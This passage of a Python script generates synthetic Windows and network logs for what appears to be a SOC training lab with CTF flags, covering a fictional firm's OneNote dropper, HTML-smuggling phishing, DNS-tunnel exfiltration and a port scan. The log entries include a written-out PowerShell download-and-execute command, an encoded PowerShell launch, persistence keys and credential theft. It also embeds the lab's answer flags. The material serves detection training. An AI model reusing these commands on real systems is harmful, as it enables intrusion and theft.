win(ts(13,22,40), "NFC-WS-029","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":3,"User":"NEXUSFINANCIAL\\r.okonkwo","Image":"C:\\ProgramData\\Microsoft\\Windows\\DeviceGuard\\OneDriveSetup.exe","SourceIp":"10.10.1.29","SourcePort":49890,"DestinationIp":"176.98.112.39","DestinationPort":443,"Protocol":"tcp","ProcessId":7280,"Message":"Network connection detected."})

win(ts(13,22,45), "NFC-WS-029","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":13,"User":"NEXUSFINANCIAL\\r.okonkwo","Image":"C:\\ProgramData\\Microsoft\\Windows\\DeviceGuard\\OneDriveSetup.exe","TargetObject":"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSyncHelper","Details":"C:\\ProgramData\\Microsoft\\Windows\\DeviceGuard\\OneDriveSetup.exe","Message":"Registry value set."})

win(ts(13,23,10), "NFC-WS-029","WinEventLog:Security",{"EventCode":4698,"SubjectUserName":"r.okonkwo","SubjectDomainName":"NEXUSFINANCIAL","TaskName":"\\Microsoft\\Windows\\WindowsUpdate\\AUSessionConnect","TaskContent":"<Task><Actions><Exec><Command>C:\\ProgramData\\Microsoft\\Windows\\DeviceGuard\\OneDriveSetup.exe</Command></Exec></Actions></Task>","Message":"A scheduled task was created."})

win(ts(13,45), "NFC-WS-029","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":10,"SourceImage":"C:\\ProgramData\\Microsoft\\Windows\\DeviceGuard\\OneDriveSetup.exe","TargetImage":"C:\\Windows\\System32\\lsass.exe","GrantedAccess":"0x1010","SourceProcessId":7280,"TargetProcessId":788,"Message":"Process accessed."})

win(ts(13,52), "NFC-WS-029","WinEventLog:Security",{"EventCode":4648,"SubjectUserName":"r.okonkwo","SubjectDomainName":"NEXUSFINANCIAL","TargetUserName":"Administrator","TargetDomainName":"NEXUSFINANCIAL","TargetServerName":"NFC-SRV-DC1","IpAddress":"10.10.0.5","Message":"A logon was attempted using explicit credentials."})

win(ts(13,52,30), "NFC-SRV-DC1","WinEventLog:Security",{"EventCode":4624,"SubjectUserName":"SYSTEM","TargetUserName":"Administrator","TargetDomainName":"NEXUSFINANCIAL","LogonType":10,"IpAddress":"10.10.1.29","WorkstationName":"NFC-WS-029","Message":"An account was successfully logged on."})

win(ts(13,55), "NFC-SRV-DC1","WinEventLog:Security",{"EventCode":4720,"SubjectUserName":"Administrator","SubjectDomainName":"NEXUSFINANCIAL","TargetUserName":"svc.healthmon","TargetDomainName":"NEXUSFINANCIAL","Message":"A user account was created."})

win(ts(13,55,5), "NFC-SRV-DC1","WinEventLog:Security",{"EventCode":4728,"SubjectUserName":"Administrator","SubjectDomainName":"NEXUSFINANCIAL","MemberName":"NEXUSFINANCIAL\\svc.healthmon","TargetUserName":"Domain Admins","TargetDomainName":"NEXUSFINANCIAL","Message":"A member was added to a security-enabled global group."})

net(ts(13,22,25), "NFC-FW-01",{"src_ip":"10.10.1.29","dst_ip":"176.98.112.39","dst_port":8080,"protocol":"tcp","action":"allow","bytes_out":512,"bytes_in":184320,"app":"unknown","user":"r.okonkwo","Message":"Firewall allow — large inbound payload."})
net(ts(13,22,40), "NFC-FW-01",{"src_ip":"10.10.1.29","dst_ip":"176.98.112.39","dst_port":443,"protocol":"tcp","action":"allow","bytes_out":1240,"bytes_in":480,"app":"unknown-ssl","user":"r.okonkwo","Message":"Firewall allow."})


# ══════════════════════════════════════════════════
# BASELINE — 13:30–14:00
# ══════════════════════════════════════════════════

win(ts(14,0), "NFC-WS-017","WinEventLog:Security",{"EventCode":4624,"TargetUserName":"j.thornton","TargetDomainName":"NEXUSFINANCIAL","LogonType":2,"IpAddress":"127.0.0.1","WorkstationName":"NFC-WS-017","Message":"An account was successfully logged on."})
win(ts(14,2), "NFC-WS-063","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"p.nair","NewProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE","CommandLine":"EXCEL.EXE \"C:\\Users\\p.nair\\Documents\\Budget_2025_Draft.xlsx\"","ParentProcessName":"C:\\Windows\\explorer.exe","Message":"A new process has been created."})
net(ts(14,0), "NFC-FW-01",{"src_ip":"10.10.1.58","dst_ip":"13.107.42.14","dst_port":443,"protocol":"tcp","action":"allow","bytes_out":3200,"bytes_in":18400,"app":"microsoft","user":"d.marsh","Message":"Firewall allow."})


# ══════════════════════════════════════════════════
# [D] MALICIOUS ONENOTE — Daniel Marsh (NFC-WS-058)
# 14:05 — Supplier invoice as .one attachment
# FLAG: NFCSOC{0n3n0t3_hta_dr0pp3d_m3}
# ══════════════════════════════════════════════════

win(ts(14,5), "NFC-WS-058","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"d.marsh","SubjectDomainName":"NEXUSFINANCIAL","NewProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\ONENOTE.EXE","CommandLine":"ONENOTE.EXE \"C:\\Users\\d.marsh\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\A8BF3C1D\\Supplier_Invoice_NFC-2024-1109.one\"","ParentProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","Message":"A new process has been created."})

win(ts(14,5,20), "NFC-WS-058","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"d.marsh","SubjectDomainName":"NEXUSFINANCIAL","NewProcessName":"C:\\Windows\\System32\\mshta.exe","CommandLine":"mshta.exe C:\\Users\\d.marsh\\AppData\\Local\\Temp\\OneNote\\16.0\\NT\\NoteBookTemp\\run.hta","ParentProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\ONENOTE.EXE","Message":"A new process has been created."})

win(ts(14,5,25), "NFC-WS-058","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":1,"User":"NEXUSFINANCIAL\\d.marsh","Image":"C:\\Windows\\System32\\mshta.exe","CommandLine":"mshta.exe C:\\Users\\d.marsh\\AppData\\Local\\Temp\\OneNote\\16.0\\NT\\NoteBookTemp\\run.hta","ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\ONENOTE.EXE","ProcessId":8102,"Hashes":"MD5=4B1AE4F18C3A928C9B7D6E5F4A3C2B1D","Message":"Process created."})

win(ts(14,5,30), "NFC-WS-058","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":1,"User":"NEXUSFINANCIAL\\d.marsh","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -w hidden -nop -c \"$c=New-Object Net.WebClient;$c.DownloadFile('http://185.176.27.132/tools/agent.exe','C:\\Users\\d.marsh\\AppData\\Roaming\\Microsoft\\Protect\\msupdate.exe');Start-Process 'C:\\Users\\d.marsh\\AppData\\Roaming\\Microsoft\\Protect\\msupdate.exe'\"","ParentImage":"C:\\Windows\\System32\\mshta.exe","ProcessId":8210,"Hashes":"MD5=DE96A6E69944335375DC1AC238336066","Message":"Process created."})

win(ts(14,5,38), "NFC-WS-058","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":11,"User":"NEXUSFINANCIAL\\d.marsh","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetFilename":"C:\\Users\\d.marsh\\AppData\\Roaming\\Microsoft\\Protect\\msupdate.exe","ProcessId":8210,"Message":"File created."})

win(ts(14,5,42), "NFC-WS-058","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":1,"User":"NEXUSFINANCIAL\\d.marsh","Image":"C:\\Users\\d.marsh\\AppData\\Roaming\\Microsoft\\Protect\\msupdate.exe","CommandLine":"C:\\Users\\d.marsh\\AppData\\Roaming\\Microsoft\\Protect\\msupdate.exe","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ProcessId":8305,"Hashes":"MD5=C9E3A1B5D7F2E4061718192021222324","Message":"Process created."})

win(ts(14,5,50), "NFC-WS-058","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":13,"User":"NEXUSFINANCIAL\\d.marsh","Image":"C:\\Users\\d.marsh\\AppData\\Roaming\\Microsoft\\Protect\\msupdate.exe","TargetObject":"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MicrosoftProtect","Details":"C:\\Users\\d.marsh\\AppData\\Roaming\\Microsoft\\Protect\\msupdate.exe","Message":"Registry value set."})

win(ts(14,6), "NFC-WS-058","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":3,"User":"NEXUSFINANCIAL\\d.marsh","Image":"C:\\Users\\d.marsh\\AppData\\Roaming\\Microsoft\\Protect\\msupdate.exe","SourceIp":"10.10.1.58","SourcePort":53421,"DestinationIp":"185.176.27.132","DestinationPort":4443,"Protocol":"tcp","ProcessId":8305,"Message":"Network connection detected."})

net(ts(14,5,30), "NFC-FW-01",{"src_ip":"10.10.1.58","dst_ip":"185.176.27.132","dst_port":80,"protocol":"tcp","action":"allow","bytes_out":320,"bytes_in":286720,"app":"http","user":"d.marsh","Message":"Firewall allow — large download."})
net(ts(14,6),    "NFC-FW-01",{"src_ip":"10.10.1.58","dst_ip":"185.176.27.132","dst_port":4443,"protocol":"tcp","action":"allow","bytes_out":1840,"bytes_in":520,"app":"unknown-ssl","user":"d.marsh","Message":"Firewall allow."})


# ══════════════════════════════════════════════════
# BASELINE — 14:30–15:20
# ══════════════════════════════════════════════════

win(ts(14,30), "NFC-WS-029","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"r.okonkwo","NewProcessName":"C:\\Windows\\System32\\mmc.exe","CommandLine":"mmc.exe","ParentProcessName":"C:\\Windows\\explorer.exe","Message":"A new process has been created."})
win(ts(14,45), "NFC-SRV-FS1","WinEventLog:Security",{"EventCode":5140,"SubjectUserName":"d.marsh","SubjectDomainName":"NEXUSFINANCIAL","IpAddress":"10.10.1.58","ShareName":"\\\\NFC-SRV-FS1\\Procurement","Message":"A network share object was accessed."})
win(ts(15,0),  "NFC-WS-017","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"j.thornton","NewProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","CommandLine":"WINWORD.EXE","ParentProcessName":"C:\\Windows\\explorer.exe","Message":"A new process has been created."})
net(ts(15,0),  "NFC-FW-01",{"src_ip":"10.10.1.41","dst_ip":"52.96.184.100","dst_port":443,"protocol":"tcp","action":"allow","bytes_out":6200,"bytes_in":14800,"app":"office365","user":"e.carter","Message":"Firewall allow."})


# ══════════════════════════════════════════════════
# [E] SUSPICIOUS EMAIL / IR — Priya Nair (NFC-WS-063)
# 15:30 — HTML smuggling attachment, credential phishing
# FLAG: NFCSOC{html_smug_cr3d_harv3st}
# ══════════════════════════════════════════════════

# Email arrives — Exchange log
win(ts(15,28), "NFC-SRV-EX1","WinEventLog:Security",{"EventCode":4624,"TargetUserName":"p.nair","TargetDomainName":"NEXUSFINANCIAL","LogonType":8,"IpAddress":"10.10.0.12","WorkstationName":"NFC-SRV-EX1","Message":"Email delivery logon — An account was successfully logged on."})

# User opens HTML attachment from Chrome
win(ts(15,30), "NFC-WS-063","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"p.nair","SubjectDomainName":"NEXUSFINANCIAL","NewProcessName":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","CommandLine":"chrome.exe \"C:\\Users\\p.nair\\AppData\\Local\\Temp\\DocuSign_Review_Required.html\"","ParentProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","Message":"A new process has been created."})

# HTML smuggling drops a zip
win(ts(15,30,15), "NFC-WS-063","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":11,"User":"NEXUSFINANCIAL\\p.nair","Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","TargetFilename":"C:\\Users\\p.nair\\Downloads\\DocuSign_Secure_Package.zip","ProcessId":9100,"Message":"File created — HTML smuggling dropped ZIP."})

# User extracts and opens the exe inside zip
win(ts(15,31), "NFC-WS-063","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"p.nair","SubjectDomainName":"NEXUSFINANCIAL","NewProcessName":"C:\\Users\\p.nair\\Downloads\\DocuSign_Secure_Package\\DocuSign_Viewer.exe","CommandLine":"DocuSign_Viewer.exe","ParentProcessName":"C:\\Windows\\explorer.exe","Message":"A new process has been created."})

win(ts(15,31,10), "NFC-WS-063","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":1,"User":"NEXUSFINANCIAL\\p.nair","Image":"C:\\Users\\p.nair\\Downloads\\DocuSign_Secure_Package\\DocuSign_Viewer.exe","CommandLine":"DocuSign_Viewer.exe","ParentImage":"C:\\Windows\\explorer.exe","ProcessId":9240,"Hashes":"MD5=F1E2D3C4B5A697887766554433221100","Message":"Process created."})

# Credential harvester — connects to phishing server
win(ts(15,31,20), "NFC-WS-063","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":3,"User":"NEXUSFINANCIAL\\p.nair","Image":"C:\\Users\\p.nair\\Downloads\\DocuSign_Secure_Package\\DocuSign_Viewer.exe","SourceIp":"10.10.1.63","SourcePort":54891,"DestinationIp":"194.165.16.11","DestinationPort":443,"Protocol":"tcp","ProcessId":9240,"Message":"Network connection detected."})

# PowerShell for persistence and further activity
win(ts(15,32), "NFC-WS-063","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":1,"User":"NEXUSFINANCIAL\\p.nair","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -nop -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACcAQwA6AFwAVQBzAGUAcgBzAFwAcAAuAG4AYQBpAHIAXABBAHAAcABEAGEAdABhAFwAUgBvAGEAbQBpAG4AZwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAUAByAG8AdABlAGMAdABcAG0AcwB1AHAAZABhAHQAZQAuAGUAeABlACcA","ParentImage":"C:\\Users\\p.nair\\Downloads\\DocuSign_Secure_Package\\DocuSign_Viewer.exe","ProcessId":9310,"Hashes":"MD5=7353F60B1739074EB17C5F4DDDEFE239","Message":"Process created."})

win(ts(15,32,10), "NFC-WS-063","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":13,"User":"NEXUSFINANCIAL\\p.nair","Image":"C:\\Users\\p.nair\\Downloads\\DocuSign_Secure_Package\\DocuSign_Viewer.exe","TargetObject":"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\DocuSignUpdate","Details":"C:\\Users\\p.nair\\Downloads\\DocuSign_Secure_Package\\DocuSign_Viewer.exe","Message":"Registry value set."})

# Second outbound connection — data sent
win(ts(15,45), "NFC-WS-063","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":3,"User":"NEXUSFINANCIAL\\p.nair","Image":"C:\\Users\\p.nair\\Downloads\\DocuSign_Secure_Package\\DocuSign_Viewer.exe","SourceIp":"10.10.1.63","SourcePort":54940,"DestinationIp":"194.165.16.11","DestinationPort":443,"Protocol":"tcp","ProcessId":9240,"Message":"Network connection detected."})

net(ts(15,30,15), "NFC-FW-01",{"src_ip":"10.10.1.63","dst_ip":"194.165.16.11","dst_port":443,"protocol":"tcp","action":"allow","bytes_out":4820,"bytes_in":1240,"app":"unknown-ssl","user":"p.nair","Message":"Firewall allow."})
net(ts(15,45),    "NFC-FW-01",{"src_ip":"10.10.1.63","dst_ip":"194.165.16.11","dst_port":443,"protocol":"tcp","action":"allow","bytes_out":18340,"bytes_in":920,"app":"unknown-ssl","user":"p.nair","Message":"Large outbound — possible credential exfil."})


# ══════════════════════════════════════════════════
# [C-exfil] FIN7 POST-EXPLOITATION: DNS TUNNELING — NFC-WS-029
# 16:10 — OneDriveSetup.exe (FIN7 payload) exfiltrates via DNS TXT
# (Part of Scenario C chain — see FIN7 block above)
# ══════════════════════════════════════════════════

# Normal DNS baseline
net(ts(16,0), "NFC-DNS-01",{"query":"nexusfinancial.com","query_type":"A","src_ip":"10.10.1.29","response":"10.10.0.10","ttl":300,"Message":"DNS query."})
net(ts(16,1), "NFC-DNS-01",{"query":"windowsupdate.microsoft.com","query_type":"A","src_ip":"10.10.1.29","response":"13.107.4.52","ttl":300,"Message":"DNS query."})
net(ts(16,2), "NFC-DNS-01",{"query":"office365.com","query_type":"A","src_ip":"10.10.1.41","response":"52.96.184.100","ttl":300,"Message":"DNS query."})

# DNS tunneling — FIN7 payload encodes creds in subdomains (part of Scenario C)
net(ts(16,10), "NFC-DNS-01",{"query":"aGVsbG8td29ybGQ.c2Vuc2l0aXZl.d4t4pipe.com","query_type":"TXT","src_ip":"10.10.1.29","response":"NXDOMAIN","ttl":0,"Message":"DNS TXT query — unusual long subdomain."})
net(ts(16,10,5), "NFC-DNS-01",{"query":"dXNlcjphZG1pbg.cGFzczpTdHIwbmc.d4t4pipe.com","query_type":"TXT","src_ip":"10.10.1.29","response":"NXDOMAIN","ttl":0,"Message":"DNS TXT query — unusual long subdomain."})
net(ts(16,10,10), "NFC-DNS-01",{"query":"Y3JlZGVudGlhbHM.c2Vuc2l0aXZlZGF0YQ.d4t4pipe.com","query_type":"TXT","src_ip":"10.10.1.29","response":"NXDOMAIN","ttl":0,"Message":"DNS TXT query — unusual long subdomain."})
net(ts(16,10,15), "NFC-DNS-01",{"query":"bmV0d29ya21hcA.aW50ZXJuYWxzY2Fu.d4t4pipe.com","query_type":"TXT","src_ip":"10.10.1.29","response":"NXDOMAIN","ttl":0,"Message":"DNS TXT query — unusual long subdomain."})
net(ts(16,10,20), "NFC-DNS-01",{"query":"ZG9tYWluYWRtaW4.aGFzaGVz.d4t4pipe.com","query_type":"TXT","src_ip":"10.10.1.29","response":"NXDOMAIN","ttl":0,"Message":"DNS TXT query — unusual long subdomain."})
net(ts(16,10,25), "NFC-DNS-01",{"query":"c2Fsd3R1bm5lbA.ZXhmaWxkYXRh.d4t4pipe.com","query_type":"TXT","src_ip":"10.10.1.29","response":"NXDOMAIN","ttl":0,"Message":"DNS TXT query — unusual long subdomain."})

# Normal DNS after (to hide in noise)
net(ts(16,15), "NFC-DNS-01",{"query":"google.com","query_type":"A","src_ip":"10.10.1.41","response":"142.250.80.46","ttl":300,"Message":"DNS query."})
net(ts(16,20), "NFC-DNS-01",{"query":"github.com","query_type":"A","src_ip":"10.10.1.29","response":"140.82.114.4","ttl":300,"Message":"DNS query."})
net(ts(16,25), "NFC-DNS-01",{"query":"teams.microsoft.com","query_type":"A","src_ip":"10.10.1.17","response":"52.113.194.132","ttl":300,"Message":"DNS query."})


# ══════════════════════════════════════════════════
# [F] LAB4: PACKET ANALYSIS — NFC-SENSOR
# 17:00 — Network sensor captures attacker traffic patterns
# FLAG: NFCSOC{p4ck3t_4nalys1s_c4ught}
# ══════════════════════════════════════════════════

# Port scan from external IP 185.220.101.45 targeting internal web server
net(ts(17,0,0),  "NFC-SENSOR",{"src_ip":"185.220.101.45","dst_ip":"10.10.0.100","dst_port":22,  "protocol":"tcp","action":"reject","flags":"SYN","bytes_out":60,"bytes_in":0,  "app":"ssh",      "Message":"Port scan — SYN to closed port."})
net(ts(17,0,1),  "NFC-SENSOR",{"src_ip":"185.220.101.45","dst_ip":"10.10.0.100","dst_port":23,  "protocol":"tcp","action":"reject","flags":"SYN","bytes_out":60,"bytes_in":0,  "app":"telnet",   "Message":"Port scan — SYN to closed port."})
net(ts(17,0,2),  "NFC-SENSOR",{"src_ip":"185.220.101.45","dst_ip":"10.10.0.100","dst_port":80,  "protocol":"tcp","action":"allow", "flags":"SYN","bytes_out":60,"bytes_in":200,"app":"http",     "Message":"Port scan — port open."})
net(ts(17,0,3),  "NFC-SENSOR",{"src_ip":"185.220.101.45","dst_ip":"10.10.0.100","dst_port":443, "protocol":"tcp","action":"allow", "flags":"SYN","bytes_out":60,"bytes_in":200,"app":"https",    "Message":"Port scan — port open."})
net(ts(17,0,4),  "NFC-SENSOR",{"src_ip":"185.220.101.45","dst_ip":"10.10.0.100","dst_port":8080,"protocol":"tcp","action":"reject","flags":"SYN","bytes_out":60,"bytes_in":0,  "app":"http-alt", "Message":"Port scan — SYN to closed port."})
net(ts(17,0,5),  "NFC-SENSOR",{"src_ip":"185.220.101.45","dst_ip":"10.10.0.100","dst_port":3389,"protocol":"tcp","action":"reject","flags":"SYN","bytes_out":60,"bytes_in":0,  "app":"rdp",      "Message":"Port scan — SYN to closed port."})
net(ts(17,0,6),  "NFC-SENSOR",{"src_ip":"185.220.101.45","dst_ip":"10.10.0.100","dst_port":21,  "protocol":"tcp","action":"allow", "flags":"SYN","bytes_out":60,"bytes_in":200,"app":"ftp",      "Message":"Port scan — FTP port open."})
net(ts(17,0,7),  "NFC-SENSOR",{"src_ip":"185.220.101.45","dst_ip":"10.10.0.100","dst_port":25,  "protocol":"tcp","action":"reject","flags":"SYN","bytes_out":60,"bytes_in":0,  "app":"smtp",     "Message":"Port scan — SYN to closed port."})

# FTP session — credentials transmitted in cleartext
net(ts(17,2,0),  "NFC-SENSOR",{"src_ip":"185.220.101.45","dst_ip":"10.10.0.100","dst_port":21,"protocol":"tcp","action":"allow","bytes_out":240,"bytes_in":180,"app":"ftp","ftp_command":"USER ftpadmin","Message":"FTP authentication — username in cleartext."})
net(ts(17,2,5),  "NFC-SENSOR",{"src_ip":"185.220.101.45","dst_ip":"10.10.0.100","dst_port":21,"protocol":"tcp","action":"allow","bytes_out":120,"bytes_in":60, "app":"ftp","ftp_command":"PASS Adm1nFTP2024!","Message":"FTP authentication — password in cleartext."})
net(ts(17,2,10), "NFC-SENSOR",{"src_ip":"185.220.101.45","dst_ip":"10.10.0.100","dst_port":21,"protocol":"tcp","action":"allow","bytes_out":80, "bytes_in":200,"app":"ftp","ftp_command":"RETR payroll_data.csv","Message":"FTP file retrieval — sensitive file accessed."})

# HTTP download of suspicious executable from attacker host
net(ts(17,5,0),  "NFC-SENSOR",{"src_ip":"10.10.1.100","dst_ip":"185.220.101.45","dst_port":80,"protocol":"tcp","action":"allow","bytes_out":480,"bytes_in":184320,"app":"http","http_method":"GET","http_uri":"/files/update.exe","http_status":200,"content_type":"application/octet-stream","Message":"HTTP download of executable from external host."})

# Large outbound transfer — data exfiltration
net(ts(17,10),   "NFC-SENSOR",{"src_ip":"10.10.1.100","dst_ip":"185.220.101.45","dst_port":443,"protocol":"tcp","action":"allow","bytes_out":4582400,"bytes_in":1024,"app":"unknown-ssl","Message":"Large outbound transfer — possible data exfiltration."})


# ══════════════════════════════════════════════════
# BASELINE — End of day logoffs
# ══════════════════════════════════════════════════

win(ts(17,0),  "NFC-WS-041","WinEventLog:Security",{"EventCode":4634,"TargetUserName":"e.carter","TargetDomainName":"NEXUSFINANCIAL","LogonType":2,"Message":"An account was logged off."})
win(ts(17,5),  "NFC-WS-029","WinEventLog:Security",{"EventCode":4634,"TargetUserName":"r.okonkwo","TargetDomainName":"NEXUSFINANCIAL","LogonType":2,"Message":"An account was logged off."})
win(ts(17,8),  "NFC-WS-058","WinEventLog:Security",{"EventCode":4634,"TargetUserName":"d.marsh","TargetDomainName":"NEXUSFINANCIAL","LogonType":2,"Message":"An account was logged off."})
win(ts(17,10), "NFC-WS-063","WinEventLog:Security",{"EventCode":4634,"TargetUserName":"p.nair","TargetDomainName":"NEXUSFINANCIAL","LogonType":2,"Message":"An account was logged off."})
win(ts(17,12), "NFC-WS-017","WinEventLog:Security",{"EventCode":4634,"TargetUserName":"j.thornton","TargetDomainName":"NEXUSFINANCIAL","LogonType":2,"Message":"An account was logged off."})


# ══════════════════════════════════════════════════
# WRITE OUTPUT
# ══════════════════════════════════════════════════

output_dir = "../sample-data"

win_security = [e for e in win_events if e["_sourcetype"]=="WinEventLog:Security"]
win_sysmon   = [e for e in win_events if e["_sourcetype"]=="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"]
win_ps       = [e for e in win_events if e["_sourcetype"]=="WinEventLog:Microsoft-Windows-PowerShell/Operational"]

with open(f"{output_dir}/windows_security.json","w") as f:
    for e in win_security:
        payload = {k:v for k,v in e.items() if not k.startswith("_")}
        f.write(json.dumps({"host":e["_host"],"event":payload})+"\n")

with open(f"{output_dir}/windows_sysmon.json","w") as f:
    for e in win_sysmon:
        payload = {k:v for k,v in e.items() if not k.startswith("_")}
        f.write(json.dumps({"host":e["_host"],"event":payload})+"\n")

with open(f"{output_dir}/windows_powershell.json","w") as f:
    for e in win_ps:
        payload = {k:v for k,v in e.items() if not k.startswith("_")}
        f.write(json.dumps({"host":e["_host"],"event":payload})+"\n")

with open(f"{output_dir}/network_firewall.json","w") as f:
    for e in [x for x in net_events if x["_host"]=="NFC-FW-01"]:
        payload = {k:v for k,v in e.items() if not k.startswith("_")}
        f.write(json.dumps({"host":e["_host"],"event":payload})+"\n")

with open(f"{output_dir}/network_dns.json","w") as f:
    for e in [x for x in net_events if x["_host"]=="NFC-DNS-01"]:
        payload = {k:v for k,v in e.items() if not k.startswith("_")}
        f.write(json.dumps({"host":e["_host"],"event":payload})+"\n")

with open(f"{output_dir}/network_sensor.json","w") as f:
    for e in [x for x in net_events if x["_host"]=="NFC-SENSOR"]:
        payload = {k:v for k,v in e.items() if not k.startswith("_")}
        f.write(json.dumps({"host":e["_host"],"event":payload})+"\n")

fw_count     = len([x for x in net_events if x["_host"]=="NFC-FW-01"])
dns_count    = len([x for x in net_events if x["_host"]=="NFC-DNS-01"])
sensor_count = len([x for x in net_events if x["_host"]=="NFC-SENSOR"])
print(f"[+] Nexus Financial Corp — Full simulation")
print(f"    windows_security.json    — {len(win_security)} events")
print(f"    windows_sysmon.json      — {len(win_sysmon)} events")
print(f"    windows_powershell.json  — {len(win_ps)} events")
print(f"    network_firewall.json    — {fw_count} events")
print(f"    network_dns.json         — {dns_count} events")
print(f"    network_sensor.json      — {sensor_count} events")
print(f"    Total                    — {len(win_events)+len(net_events)} events")
